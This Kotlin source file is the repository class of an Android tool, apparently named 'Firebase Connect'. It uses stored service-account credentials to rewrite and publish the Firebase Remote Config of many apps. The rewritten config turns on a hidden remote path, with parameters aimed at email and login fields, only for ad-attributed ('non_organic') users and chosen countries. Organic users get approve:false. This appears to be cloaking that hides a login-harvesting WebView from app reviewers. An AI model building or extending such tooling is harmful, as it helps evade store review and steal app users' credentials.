package com.smh.fbconnect.data.repository

import android.content.Context
import android.net.Uri
import android.util.Log
import android.widget.Toast
import com.google.auth.oauth2.GoogleCredentials
import com.google.firebase.FirebaseApp
import com.google.firebase.FirebaseOptions
import com.google.firebase.remoteconfig.*
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.google.gson.reflect.TypeToken
import com.smh.fbconnect.data.local.db.DatabaseHelper
import com.smh.fbconnect.data.local.entity.AppEntity
import com.smh.fbconnect.data.local.model.RemoteConfigs
import com.smh.fbconnect.data.local.model.WebViewConfigs
import com.smh.fbconnect.utils.dispatchers.DispatcherProvider
import com.smh.fbconnect.utils.extensions.toWords
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.launch
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
@ExperimentalCoroutinesApi
class Repository @Inject constructor(
    @ApplicationContext private val context: Context,
    private val dispatcherProvider: DispatcherProvider,
    private val dbHelper: DatabaseHelper
    ) {

    private fun initializeApp(app: AppEntity): FirebaseApp {

        val inputStream = context.contentResolver.openInputStream(app.credentialsPath)

        val options = FirebaseOptions.builder()
            .setCredentials(GoogleCredentials.fromStream(inputStream))
            .build()

        val firebaseApps = FirebaseApp.getApps()

        return firebaseApps.find { it.name == app.name } ?: run {
            FirebaseApp.initializeApp(options, app.name)
        }
    }

    private fun publishTemplate(
        template: Template,
        firebaseApp: FirebaseApp
    ): Flow<Unit> {

        return flow {

            runCatching {
                FirebaseRemoteConfig.getInstance(firebaseApp)
                    .publishTemplateAsync(template).get()
                Toast.makeText(
                    context,
                    "Изменения успешно опубликованы",
                    Toast.LENGTH_LONG
                ).show()
            }.onFailure {
                if (it.cause is FirebaseRemoteConfigException) {
                    Log.d("DebugTest", it.cause?.message.toString())
                    Toast.makeText(
                        context,
                        "При публикации произошоа ошибка ${it.cause?.message.toString()}",
                        Toast.LENGTH_LONG
                    ).show()
                }
            }

            emit(Unit)

        }.flowOn(dispatcherProvider.io)

    }

    fun getApps(page: Int): Flow<MutableList<AppEntity>> = flow {

        val allAppsChunkedList = dbHelper.getApps()?.chunked(size = 20)

        allAppsChunkedList?.let { list ->

            runCatching {
                emit(
                    list[page - 1].toMutableList()
                )
            }.onFailure {
                emit(
                    mutableListOf<AppEntity>()
                )
            }
        }?: run {
            emit(
                mutableListOf<AppEntity>()
            )
        }

    }.flowOn(dispatcherProvider.io)

    fun saveApp(appName: String, appCredentials: Uri): Flow<AppEntity?> = flow {

        dbHelper.insertApp(
            app = AppEntity(
                id = 0,
                name = appName,
                credentialsPath = appCredentials
            )
        )

        emit(
            dbHelper.getAppByName(appName = appName)
        )

    }.flowOn(dispatcherProvider.io)

    fun getAppConfigs(appId: Int): Flow<RemoteConfigs> {

        return flow {

            dbHelper.getAppById(appId = appId)?.let { app ->

                val remoteConfigs = RemoteConfigs().apply {
                    id = app.id
                    app_name = app.name
                }

                val initializedApp = initializeApp(app = app)

                val template = FirebaseRemoteConfig
                    .getInstance(initializedApp)
                    .templateAsync
                    .get()

                template.conditions?.takeIf { it.isNotEmpty() }?.also { conditions ->
                    for (condition in conditions) {
                        if (condition.name == "geo") {

                            val pattern = "\'(.*)\'".toRegex()
                            val foundedGeoString = pattern.find(condition.expression)?.value
                            val geoArray = foundedGeoString?.toWords()

                            remoteConfigs.geos = geoArray
                        }
                    }
                }

                runCatching {

                    val templateJson: JsonObject = Gson().fromJson(
                        template.toJSON(),
                        object : TypeToken<JsonObject>() {}.type
                    )

                    val geoValue = templateJson
                        .getAsJsonObject("parameters")
                        .getAsJsonObject("settings")
                        .getAsJsonObject("conditionalValues")
                        .getAsJsonObject("geo")
                        .get("value").asString

                    val webViewConfigs: WebViewConfigs = Gson().fromJson(
                        geoValue,
                        object : TypeToken<WebViewConfigs>() {}.type
                    )

                    remoteConfigs.path = webViewConfigs.path
                }



                Log.d("DebugTest", "$remoteConfigs")

                emit(remoteConfigs)
            }

        }.flowOn(dispatcherProvider.io)
    }

    fun updateAppConfigs(configs: RemoteConfigs): Flow<Unit> {

        return flow {

            dbHelper.getAppById(appId = configs.id)?.let { app ->

                val initializedApp = initializeApp(app = app)

                val template = FirebaseRemoteConfig
                    .getInstance(initializedApp)
                    .templateAsync
                    .get()

                configs.geos?.let { geos ->

                    template.conditions = mutableListOf(
                        Condition("non_organic", "app.userProperty['non_organic'].exactlyMatches(['true'])"),
                        Condition("geo", "device.country in ${geos.joinToString(
                            prefix = "[",
                            postfix = "]",
                            separator = ", ",
                            transform = { "'$it'" }
                        )}"),
                    )
                }

                configs.path?.let { path ->

                    template.parameters["settings"] = Parameter()
                        .setDefaultValue(ParameterValue.of("{\"approve\":false}"))
                        .setConditionalValues(
                            mapOf(
                                "non_organic" to ParameterValue.of("{\"approve\":true,\"path\":\"$path\",\"params\":[{\"key\":\"type\",\"value\":\"email\"},{\"key\":\"type\",\"value\":\"mail\"},{\"key\":\"name\",\"value\":\"mail\"},{\"key\":\"name\",\"value\":\"login\"}]}"),
                                "geo" to ParameterValue.of("{\"approve\":true,\"path\":\"$path\",\"params\":[{\"key\":\"type\",\"value\":\"email\"},{\"key\":\"type\",\"value\":\"mail\"},{\"key\":\"name\",\"value\":\"mail\"},{\"key\":\"name\",\"value\":\"login\"}]}")
                            )
                        )
                        .setValueType(ParameterValueType.JSON)
                        .setDescription("set by Firebase Connect")

                }

                publishTemplate(
                    template = template,
                    firebaseApp = initializedApp
                ).collect {
                    emit(Unit)
                }
            }

        }.flowOn(dispatcherProvider.io)
    }
}